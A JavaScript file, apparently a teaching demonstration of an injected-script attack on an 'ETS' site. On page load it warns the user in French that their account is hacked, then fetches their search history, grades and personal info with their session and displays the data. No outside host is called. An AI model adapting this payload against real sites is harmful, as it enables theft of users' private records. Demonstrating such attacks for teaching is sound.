window.onload = () => {

    const div = document.createElement("DIV")
    div.style = "border:1px solid black;"
    document.body.appendChild(div)

    // Get search history
    domTextNode("Votre compte a ete pirate!")
    domTextNode("Des donnees seront extraites de votre compte 'ETS', puisque vous etes authentifie.e.s! Ce script a ete injecte avec les privileges du domaine 'ETS'.")
    domTextNode("Extraction des donnees en cours...")
    
    setTimeout( () => {
        let searchHistoryURL = "/searchhistory"
        domTextNode("Acces a l'URL: " + searchHistoryURL)
        //getSearchHistory 
        fetch(searchHistoryURL)
            .then( response => response.json() )
            .then( data => {
                domTextNode( JSON.stringify( data ) )
                domTextNode("Votre historique de recherche a ete extrait et transmis...")
            });
    }, 10000)

    setTimeout( () => {
        let gradesURL = "/grades"
        domTextNode("Acces a l'URL: " + gradesURL)
        // Get grades
        fetch(gradesURL)
            .then( response => response.json() )
            .then( data => {
                domTextNode( JSON.stringify( data ) )
                domTextNode("Vos resultats ont ete transmis...")
            });
    }, 15000)

    setTimeout( () => {
        let gradesURL = "/personalinfo"
        domTextNode("Acces a l'URL: " + gradesURL)
        // Get grades
        fetch(gradesURL)
            .then( response => response.json() )
            .then( data => {
                domTextNode( JSON.stringify( data ) )
                domTextNode("Vos infos personnelles ont ete transmises...")
            });
    }, 20000)    
    
    function domTextNode(str) {
        div.appendChild( document.createTextNode(str) )
        div.appendChild( document.createElement("BR") )
        div.appendChild( document.createElement("BR") )
    }
    
}
